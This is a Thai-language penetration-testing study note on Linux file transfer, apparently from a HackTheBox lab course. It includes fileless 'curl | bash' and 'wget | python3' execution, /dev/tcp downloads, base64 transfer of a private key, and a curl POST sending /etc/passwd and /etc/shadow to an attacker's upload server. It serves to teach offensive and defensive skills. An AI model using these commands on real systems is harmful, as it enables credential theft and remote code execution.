# Linux File Transfer Methods

## บทนำ (Introduction)

Linux เป็นระบบปฏิบัติการที่มีความยืดหยุ่นสูง และมีเครื่องมือมากมายที่สามารถใช้ในการถ่ายโอนไฟล์ การเข้าใจวิธีการถ่ายโอนไฟล์บน Linux ช่วยให้ทั้งผู้โจมตีและผู้ป้องกันสามารถพัฒนาทักษะในการโจมตีเครือข่ายและป้องกันการโจมตีที่ซับซ้อนได้

---

## กรณีศึกษาจากการตอบสนองต่อเหตุการณ์ (Incident Response Case Study)

### สถานการณ์
- พบผู้โจมตีหลายราย (Threat Actors) ใน **6 จาก 9 เว็บเซิร์ฟเวอร์** ที่ตรวจสอบ
- ผู้โจมตีพบช่องโหว่ **SQL Injection**

### วิธีการโจมตี
ผู้โจมตีใช้ Bash Script ที่พยายามดาวน์โหลด Malware โดยใช้ **3 วิธี** ตามลำดับ:

1. **cURL** - พยายามครั้งแรก
2. **wget** - ถ้า cURL ล้มเหลว
3. **Python** - ถ้า wget ล้มเหลว

> **หมายเหตุ:** ทั้ง 3 วิธีใช้ HTTP ในการสื่อสาร แม้ว่า Linux จะรองรับ FTP และ SMB แต่ Malware ส่วนใหญ่บนทุกระบบปฏิบัติการใช้ **HTTP และ HTTPS** สำหรับการสื่อสาร

---

## การดาวน์โหลดไฟล์ (Download Operations)

### สถานการณ์
เราเข้าถึงเครื่อง NIX04 ได้แล้ว และต้องการดาวน์โหลดไฟล์จากเครื่อง Pwnbox

---

## 1. Base64 Encoding / Decoding

### ข้อดี
- **ไม่ต้องใช้การสื่อสารทางเครือข่าย**
- เหมาะกับการถ่ายโอนไฟล์ขนาดเล็กถึงกลาง

### ขั้นตอนการใช้งาน

#### **บน Pwnbox (เครื่องต้นทาง):**

**ตรวจสอบ MD5 Hash:**
```bash
md5sum id_rsa
# ผลลัพธ์: 4e301756a07ded0a2dd6953abf015278  id_rsa
```

**เข้ารหัสไฟล์เป็น Base64:**
```bash
cat id_rsa | base64 -w 0; echo
```
- `-w 0`: สร้าง Base64 ในบรรทัดเดียว
- `;echo`: ขึ้นบรรทัดใหม่เพื่อให้คัดลอกง่าย

#### **บน Linux Target (เครื่องปลายทาง):**

**ถอดรหัส Base64:**
```bash
echo -n 'LS0tLS1CRUdJTi....' | base64 -d > id_rsa
```
- `-n`: ไม่เพิ่ม newline ต่อท้าย
- `-d`: ถอดรหัส (decode)

**ยืนยันความถูกต้อง:**
```bash
md5sum id_rsa
# ต้องได้ Hash เดียวกับต้นทาง: 4e301756a07ded0a2dd6953abf015278
```

### การทำงานในทิศทางตรงข้าม
สามารถใช้วิธีเดียวกันเพื่อ**อัปโหลด**ไฟล์จาก Target กลับไปยัง Pwnbox:
```bash
# บน Target
cat /etc/passwd | base64 -w 0; echo

# บน Pwnbox  
echo -n 'base64_string' | base64 -d > passwd
```

---

## 2. Web Downloads ด้วย Wget และ cURL

### wget (Web Get)

**คุณสมบัติ:**
- เครื่องมือดาวน์โหลดไฟล์ที่ได้รับความนิยม
- ติดตั้งมาใน Linux Distributions ส่วนใหญ่

**ตัวอย่างการใช้งาน:**
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
- `-O`: กำหนดชื่อไฟล์ output (ตัวพิมพ์ใหญ่)

### cURL (Client URL)

**คุณสมบัติ:**
- คล้ายกับ wget แต่มีความยืดหยุ่นมากกว่า
- รองรับ Protocol หลากหลาย

**ตัวอย่างการใช้งาน:**
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
- `-o`: กำหนดชื่อไฟล์ output (ตัวพิมพ์เล็ก)

### ความแตกต่างสำคัญ
| คำสั่ง | Output Option | หมายเหตุ |
|--------|---------------|----------|
| wget | `-O` (ตัวใหญ่) | โฟกัสการดาวน์โหลด |
| curl | `-o` (ตัวเล็ก) | ยืดหยุ่นกว่า |

---

## 3. Fileless Attacks Using Linux

### หลักการ
- **ไม่ดาวน์โหลดไฟล์ลงดิสก์**
- รันโค้ดโดยตรงผ่าน **Pipe (|)**
- ใช้ประโยชน์จากการทำงานของ Linux Pipes

### ⚠️ ข้อควรระวัง
บาง Payloads เช่น `mkfifo` อาจเขียนไฟล์ชั่วคราวลงดิสก์แม้จะใช้ Pipe

### ตัวอย่างการใช้งาน

#### **Fileless Download ด้วย cURL:**
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
- ดาวน์โหลดและรันทันที ไม่มีไฟล์บนดิสก์

#### **Fileless Download ด้วย wget:**
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
- `-q`: โหมดเงียบ (quiet)
- `-O-`: Output ไปที่ stdout แทนไฟล์
- ส่งต่อไปยัง Python interpreter ทันที

---

## 4. Download with Bash (/dev/tcp)

### เมื่อไหร่ควรใช้
- เมื่อ**ไม่มีเครื่องมือ**ดาวน์โหลดไฟล์ทั่วไป (wget, curl)
- เครื่องมีแค่ Bash ติดตั้ง

### ข้อกำหนด
- Bash เวอร์ชัน 2.04 หรือสูงกว่า
- Compile ด้วย `--enable-net-redirections`

### ขั้นตอนการใช้งาน

**1. เชื่อมต่อไปยัง Web Server:**
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```
- `3`: File descriptor number
- `/dev/tcp/IP/PORT`: อุปกรณ์เสมือนสำหรับ TCP connection

**2. ส่ง HTTP GET Request:**
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
- `>&3`: ส่ง output ไปยัง file descriptor 3

**3. แสดงผลลัพธ์:**
```bash
cat <&3
```
- `<&3`: อ่านข้อมูลจาก file descriptor 3

---

## 5. SSH Downloads (SCP)

### SSH (Secure Shell)
- Protocol สำหรับเข้าถึงคอมพิวเตอร์ระยะไกลอย่างปลอดภัย
- มาพร้อม **SCP (Secure Copy)** สำหรับถ่ายโอนไฟล์

### SCP คืออะไร?
- เครื่องมือ command-line สำหรับคัดลอกไฟล์ระหว่าง hosts อย่างปลอดภัย
- คล้าย `copy` หรือ `cp` แต่ทำงานผ่านเครือข่าย
- ใช้ SSH Protocol (พอร์ต 22) โดยค่าเริ่มต้น

### ตั้งค่า SSH Server บน Pwnbox

**1. Enable SSH Service:**
```bash
sudo systemctl enable ssh
```

**2. Start SSH Service:**
```bash
sudo systemctl start ssh
```

**3. ตรวจสอบว่า SSH กำลัง Listen:**
```bash
netstat -lnpt
# ควรเห็น: tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN
```

### ดาวน์โหลดไฟล์จาก Remote ไปยัง Local

**Syntax:**
```bash
scp username@remote_ip:/path/to/file /local/destination
```

**ตัวอย่าง:**
```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```
- `.`: คัดลอกมาที่ current directory

### 💡 คำแนะนำด้านความปลอดภัย
สร้าง temporary user account สำหรับถ่ายโอนไฟล์ เพื่อไม่ต้องใช้ credentials หรือ keys หลักบนคอมพิวเตอร์ระยะไกล

---

## การอัปโหลดไฟล์ (Upload Operations)

มีสถานการณ์หลายอย่างที่ต้องอัปโหลดไฟล์จาก Target กลับไปยัง Attack Host เช่น:
- **Binary Exploitation Analysis**
- **Packet Capture Analysis**
- **Log File Analysis**

---

## 1. Web Upload

### ใช้ uploadserver Module

**ติดตั้ง uploadserver:**
```bash
sudo python3 -m pip install --user uploadserver
```

### ใช้ HTTPS สำหรับความปลอดภัย

**1. สร้าง Self-Signed Certificate:**
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

**2. สร้างไดเรกทอรีสำหรับ Web Server:**
```bash
mkdir https && cd https
```

**3. เริ่ม Upload Server ด้วย HTTPS:**
```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
# File upload available at /upload
# Serving HTTPS on 0.0.0.0 port 443
```

### อัปโหลดไฟล์จาก Linux Target

**อัปโหลดหลายไฟล์พร้อมกัน:**
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
- `-X POST`: ใช้ HTTP POST method
- `-F`: ส่งข้อมูลแบบ form
- `@`: บ่งบอกว่าเป็นไฟล์
- `--insecure`: ยอมรับ self-signed certificate

---

## 2. Alternative Web File Transfer Method

### หลักการ
- Linux มักมี Python หรือ PHP ติดตั้งอยู่แล้ว
- สามารถสร้าง Web Server เพื่อแชร์ไฟล์ได้ง่าย

### สร้าง Web Server ด้วยภาษาต่างๆ

#### **Python 3:**
```bash
python3 -m http.server
# Serving HTTP on 0.0.0.0 port 8000
```

#### **Python 2.7:**
```bash
python2.7 -m SimpleHTTPServer
# Serving HTTP on 0.0.0.0 port 8000
```

#### **PHP:**
```bash
php -S 0.0.0.0:8000
# PHP Development Server started
```

#### **Ruby:**
```bash
ruby -run -ehttpd . -p8000
# WEBrick HTTPServer#start: pid=1705 port=8000
```

### ดาวน์โหลดไฟล์ไปยัง Pwnbox

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

### ⚠️ ข้อควรระวัง
- ต้องพิจารณาว่า Inbound Traffic อาจถูกบล็อก
- นี่เป็นการ**ดาวน์โหลด**จาก Target ไปยัง Attack Host (ไม่ใช่การอัปโหลด)

---

## 3. SCP Upload

### เมื่อไหร่ควรใช้
- บริษัทอนุญาตให้ใช้ SSH Protocol (TCP/22) สำหรับ Outbound Connections
- ต้องการความปลอดภัยในการถ่ายโอนไฟล์

### ตัวอย่างการใช้งาน

**อัปโหลดไฟล์ไปยัง Target:**
```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

**Syntax:**
```bash
scp /local/file username@remote_ip:/remote/path
```

### 💡 เคล็ดลับ
Syntax ของ SCP คล้ายกับ `cp` หรือ `copy`:
- `scp source destination`
- แค่เพิ่ม `username@ip:` สำหรับ remote location

---
